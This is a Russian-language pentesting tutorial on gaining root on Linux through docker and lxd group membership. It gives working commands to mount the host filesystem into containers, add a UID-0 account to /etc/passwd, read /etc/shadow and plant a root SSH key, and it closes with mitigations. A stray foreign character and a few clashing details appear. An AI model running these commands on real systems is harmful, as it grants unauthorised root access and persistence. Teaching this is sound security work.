# Повышение привилегий на Linux через группы LXD и Docker

## Контекст и базовые понятия

Повышение привилегий (Privilege Escalation) является критической фазой в процессе тестирования на проникновение, направленной на получение прав администратора (root) или SYSTEM от имени пользователя с более низкими правами. В контексте Linux-инфраструктур одним из наиболее распространенных векторов атаки является злоупотребление членством в специализированных системных группах. Группа `lxd` и группа `docker` исторически выделяются как «привилегированные группы», членство в которых фактически эквивалентно получению прав root, несмотря на отсутствие прямого членства в группе `sudo` или `wheel`.

Для понимания механизма атаки необходимо разграничить понятия «контейнеризация», «виртуализация» и «механизмы контроля доступа». Контейнеры (LXC/LXD, Docker) предоставляют изоляцию процессов на уровне ядра Linux (namespaces и cgroups), но не являются полноценной виртуализацией, так как используют общее ядро хоста. Изоляция контейнеров по умолчанию не является абсолютной; она зависит от конфигурации демона и прав пользователя, инициирующего создание контейнера.

Ключевое различие между `lxd` и `docker` заключается в архитектуре взаимодействия и модели доверия, хотя результат (получение root на хосте) идентичен.

**Разграничение сущностей:**

| Сущность | Архитектура | Модель доверия (по умолчанию) | Механизм атаки | Риски для администратора |
| :--- | :--- | :--- | :--- | :--- |
| **Группа `docker`** | Клиент-серверная (Docker Daemon). Демон работает от root. | Пользователь в группе `docker` может управлять демоном. Управление демоном = управление хостом. | Монтирование корневой файловой системы хоста в контейнер. | Разработчики часто добавляются в группу для удобства. Отсутствие аудита действий демона. |
| **Группа `lxd`** | REST API + Daemon (LXD). LXD является оберткой над LXC. | Пользователь в группе `lxd` может выполнять любые операции через API LXD. LXD выполняет операции от имени root. | 1. Монтирование `/` в контейнер.<br>2. Проброс Unix-сокетов (proxy devices) для перехвата прав systemd. | Изначально документация рекомендовала добавление пользователей в группу для «управления». Риск скрыт в природе Unix-сокетов. |
| **Группа `sudo`** | PAM-модуль. | Пользователь может выполнять команды, указанные в `/etc/sudoers`, от имени root. | Прямое выполнение команд. | Ограничен списком разрешенных команд. Логирование действий. |
| **Группа `wheel`** | PAM-модуль (часто используется в Arch/Fedora). | Аналогично `sudo`, но часто требует явного указания в PAM. | Прямое выполнение команд. | Аналогично `sudo`. |

**Почему это происходит?**
Основная причина уязвимости заключается в том, что демоны `docker` и `lxd` запускаются с правами root для выполнения низкоуровневых операций (создание сетевых интерфейсов, управление cgroups, монтирование файловых систем). Когда пользователь, не являющийся root, отправляет запрос демону через Unix-сокет (который по умолчанию принадлежит root, но доступен для записи членам соответствующей группы), демон выполняет действие **от своего имени (root)**, а не от имени пользователя.

Таким образом, членство в `docker` или `lxd` предоставляет не просто «возможность запускать контейнеры», а полный контроль над хост-системой, так как контейнер может быть сконфигурирован так, чтобы иметь прямой доступ к файловой системе хоста.

## Внутреннее устройство уязвимости

Уязвимость базируется на двух фундаментальных аспектах: архитектуре демона и механизмах изоляции Linux.

### Архитектура демона и Unix-сокеты

И `docker`, и `lxd` используют Unix Domain Sockets (UDS) для взаимодействия с клиентами. В Linux права доступа к сокету определяются стандартными правами файловой системы (UID/GID).

*   **Docker:** Демон `dockerd` запускается от root. Сокет обычно находится в `/var/run/docker.sock`. Права на сокет: `srw-rw---- root:docker`. Любой пользователь в группе `docker` может писать в сокет.
*   **LXD:** Демон `lxd` запускается от root. Сокет обычно находится в `/var/snap/lxd/common/lxd/unix.socket` (для snap-версии) или `/var/lib/lxd/unix.socket`. Права на сокет: `srw-rw---- root:lxd`.

Пользователь, имеющий запись в сокет, может отправлять JSON-запросы API. Поскольку демон работает от root, он выполняет команды с правами root. Разница заключается в том, как именно эти команды интерпретируются.

### Механизм изоляции и его обход

Контейнеры используют **namespaces** (имена пространств) для изоляции PID, UID, GID, IPC, network и mount. Однако **cgroups** (control groups) управляют ресурсами, а не безопасностью.

**Ключевая уязвимость:**
Если контейнер запускается с флагом привилегированного доступа (`privileged` в Docker, `security.privileged=true` в LXD) или если пользователь может смонтировать произвольный путь хоста в контейнер, изоляция монтирования (mount namespace) может быть обойдена.

В Linux процесс внутри контейнера видит смонтированную файловую систему. Если в контейнер смонтирован корень хоста (`/`), то процесс внутри контейнера, запущенный от root (что является дефолтом для контейнеров), получает root-доступ к файлам хоста.

### Сравнительный анализ векторов атаки

| Характеристика | Вектор Docker | Вектор LXD (v1: Mount) | Вектор LXD (v2: Socket Relay) |
| :--- | :--- | :--- | :--- |
| **Требуемое условие** | Членство в группе `docker`. | Членство в группе `lxd`. | Членство в группе `lxd`. |
| **Основной механизм** | `docker run -v /:/host` | `lxc config device add ... source=/` | `lxc config device add ... type=proxy` |
| **Привилегии контейнера** | Не обязательно privileged, но часто используется. | Требуется `security.privileged=true` или монтирование диска. | Не требует privileged-контейнера. |
| **Цель эксплуатации** | Запись в `/etc/shadow`, `/etc/passwd`, добавление SSH-ключа. | Аналогично Docker. | Перехват прав systemd через `systemd-private` socket. |
| **Сложность реализации** | Низкая (одна команда). | Средняя (создание контейнера, настройка устройства). | Высокая (требует Python-скрипта для ретрансляции). |
| **Обнаружение** | Легко: `docker ps`, `ls -l /var/run/docker.sock`. | Легко: `lxc list`, `ls -l /var/snap/lxd/...`. | Сложнее: требует анализа активности systemd. |

**Иллюстративная схема взаимодействия LXD Socket Relay (v2):**

```text
[Атакующий (user)]
      │
      │ (запрос через API LXD)
      ▼
[LXD Daemon (root)] ──(создание proxy device)──▶ [Unix Socket в Контейнере]
      │                                              │
      │ (LXD использует свои root-права для проброса)│ (сокет systemd)
      ▼                                              ▼
[Unix Socket на Хосте (systemd)] ◀──(ретрансляция)── [Контейнер (root)]
      │
      │ (systemd доверяет UID/CRED от сокета)
      ▼
[Выполнение команды от имени root]
```

В векторе LXD v2 (описанном в `lxd_root`) атакующий не монтирует файловую систему. Вместо этого он создает proxy-устройство, которое связывает сокет systemd на хосте (`/run/systemd/private`) с сокетом внутри контейнера. Поскольку LXD создает этот канал от имени root, сообщения, отправляемые из контейнера, получают credentials (UID 0) на стороне хоста. systemd, получая запрос от UID 0, выполняет его, позволяя атакующему создавать сервисы, которые запускают команды от имени root.

## Применение и работа с предметом

На практике тестировщик должен уметь выявлять членство в этих группах и понимать, как именно будет происходить эксплуатация в зависимости от версии ПО и конфигурации.

### Обнаружение (Enumeration)

Первым шагом является определение наличия уязвимых групп.

```bash
# Проверка текущих групп пользователя
groups
id

# Проверка членства в группе docker
groups | grep -q docker && echo "User is in docker group"

# Проверка членства в группе lxd
groups | grep -q lxd && echo "User is in lxd group"

# Проверка прав на сокет docker (если есть доступ к файловой системе)
ls -l /var/run/docker.sock
# Ожидаемый вывод: srw-rw---- 1 root docker ... /var/run/docker.sock

# Проверка наличия LXD
which lxc
lxc list
```

### Эксплуатация Docker

Классический метод требует монтирования корневой файловой системы хоста в контейнер.

```bash
# 1. Запуск контейнера с монтированием корня хоста в /host
docker run -v /:/host --rm -it ubuntu bash

# 2. Внутри контейнера (уже от root)
# Добавление нового пользователя с правами root
echo "newuser:x:0:0::/root:/bin/bash" >> /host/etc/passwd

# Или добавление SSH-ключа для постоянного доступа
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA... attacker@host" > /host/root/.ssh/authorized_keys
```

**Важно:** Если контейнер не привилегированный, но позволяет монтирование, вектор остается рабочим. Однако, если Docker настроен с использованием `rootless` режима, уязвимость отсутствует.

### Эксплуатация LXD (v1: Mount)

Метод аналогичен Docker, но использует API LXC/LXD.

```bash
# 1. Инициализация привилегированного контейнера
lxc init ubuntu:16.04 exploit -c security.privileged=true

# 2. Добавление устройства (монтирование корня хоста)
lxc config device add exploit mydevice disk source=/ path=/mnt/root recursive=true

# 3. Запуск контейнера
lxc start exploit

# 4. Выполнение команд внутри контейнера
lxc exec exploit bash

# 5. Внутри контейнера
cat /mnt/root/etc/shadow
# Или модификация пароля root
chroot /mnt/root passwd
```

### Эксплуатация LXD (v2: Socket Relay)

Этот метод более изощрен и не требует монтирования файловой системы, что может обойти некоторые средства защиты на основе мониторинга монтирования. Он требует использования скрипта, такого как `lxd_rootv2.py` из репозитория `initstring/lxd_root`.

Скрипт выполняет следующие шаги:
1. Создает привилегированный контейнер.
2. Создает proxy-устройство, связывающее сокет systemd на хосте с сокетом в контейнере.
3. Внутри контейнера использует `systemd-run` для создания сервиса, который выполняется от имени root на хосте.

```bash
# Запуск эксплойта (требует Python 3 и установленного lxd)
python3 lxd_rootv2.py <имя_контейнера>
```

**Ожидаемый результат:** Скрипт создает временный сервис systemd, который добавляет текущего пользователя в группу `sudo` или `root`, после чего удаляет сервис.

### Типичные ошибки и подводные камни

1.  **Rootless Docker:** В современных версиях Docker (20.10+) поддерживается rootless-режим. В этом случае демон запускается от UID обычного пользователя, и членство в группе `docker` не дает прав root. Однако, если rootless-режим не настроен явно, по умолчанию используется root-демон.
2.  **Snap vs Package:** В Ubuntu LXD часто устанавливается через Snap. Путь к сокету отличается (`/var/snap/lxd/common/lxd/unix.socket`), но права доступа аналогичны. Эксплуатация не меняется, но путь к сокету важен для ручного анализа.
3.  **AppArmor/SELinux:** Механизмы мандатного контроля доступа могут блокировать монтирование или проброс сокетов. Однако по умолчанию в большинстве дистрибутивов эти профили достаточно宽容ны для контейнеров, особенно если они создаются через API.
4.  **Аудит:** Действия через `docker` и `lxd` не логируются в `/var/log/auth.log` так же, как `sudo`. Это делает обнаружение атаки затруднительным без специализированных средств (auditd, EDR).

## Сквозной практический пример: Повышение привилегий через группу Docker

**Исходные условия:**
*   **Среда:** Виртуальная машина с Ubuntu 20.04 LTS.
*   **Роль:** Тестировщик на проникновение, имеющий доступ к учетной записи `pentester` с правами обычного пользователя.
*   **Конфигурация:** Пользователь `pentester` добавлен в группу `docker`. Docker Daemon запущен от root (стандартная установка).
*   **Цель:** Получение root-shell на хост-системе.

### Шаг 1: Подтверждение членства в группе

Атакующий проверяет свои права, чтобы подтвердить наличие доступа к Docker API.

```bash
pentester@target:~$ groups
pentester adm cdrom sudo dip plugdev lxd docker

pentester@target:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
# Вывод пуст, так как контейнеров нет, но команда выполнилась успешно
```

*Ожидаемый результат:* Команда `docker ps` выполняется без ошибок `permission denied`. Это подтверждает, что сокет `/var/run/docker.sock` доступен для записи.

### Шаг 2: Создание и запуск контейнера с монтированием хоста

Атакующий запускает контейнер Ubuntu, монтируя корневую файловую систему хоста в директорию `/host` внутри контейнера.

```bash
pentester@target:~$ docker run -v /:/host --rm -it ubuntu bash
root@<container_id>:/#
```

*Ожидаемый результат:* Атакующий получает оболочку `bash` внутри контейнера, запущенную от пользователя `root` (UID 0). Файловая система хоста доступна по пути `/host`.

### Шаг 3: Модификация файла авторизации SSH

Для обеспечения постоянного доступа атакующий генерирует SSH-ключ и добавляет публичный ключ в файл `authorized_keys` пользователя root на хосте.

```bash
# Внутри контейнера
root@<container_id>:/# mkdir -p /host/root/.ssh
root@<container_id>:/# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@kali" > /host/root/.ssh/authorized_keys
root@<container_id>:/# chmod 700 /host/root/.ssh
root@<container_id>:/# chmod 600 /host/root/.ssh/authorized_keys
```

*Ожидаемый результат:* Файлы созданы. Поскольку контейнер имеет прямой доступ к файловой системе хоста, изменения немедленно применяются к хосту.

### Шаг 4: Выход из контейнера и проверка доступа

Атакующий выходит из контейнера и пытается подключиться к хосту по SSH.

```bash
root@<container_id>:/# exit
pentester@target:~$ exit
# Возврат к терминалу хоста

# На машине атакующего (Kali Linux)
attacker@kali:~$ ssh root@<IP_target>
```

*Ожидаемый результат:* Подключение по SSH успешно. Атакующий получает root-shell на хост-системе.

### Ожидаемый вывод примера

Данный пример демонстрирует, что членство в группе `docker` позволяет не только управлять контейнерами, но и обходить изоляцию файловой системы. Монтирование корня хоста (`/`) в контейнер делает его привилегии (root внутри контейнера) эквивалентными правам root на хосте. Это классический пример повышения привилегий через злоупотребление доверенной группой.

## Аналитический вывод

Уязвимость групп `docker` и `lxd` является фундаментальной проблемой архитектуры контейнеризации на Linux, основанной на доверии к демону, работающему от имени root. Членство в этих группах предоставляет полный контроль над хост-системой, так как позволяет монтировать произвольные файловые системы или перехватывать системные вызовы через Unix-сокеты.

Ключевые выводы для специалистов по информационной безопасности:
1.  **Принцип наименьших привилегий:** Группы `docker` и `lxd` должны рассматриваться как эквивалентные группе `sudo`. Их использование должно быть строго ограничено и аудировано.
2.  **Rootless-режим:** Для снижения рисков необходимо использовать rootless-режимы Docker и LXD, где демоны запускаются от имени обычных пользователей, что устраняет вектор атаки через права root демона.
3.  **Мониторинг:** Стандартные логи аутентификации не фиксируют действия через эти группы. Необходим настройка `auditd` для мониторинга доступа к сокетам Docker/LXD и создания правил детекции для подозрительных операций (монтирование `/`, создание привилегированных контейнеров).
4.  **Разделение сред:** В многопользовательских средах следует использовать изолированные пространства имен или отдельные хосты для каждого пользователя, чтобы предотвратить горизонтальное перемещение и эскалацию привилегий между пользователями.
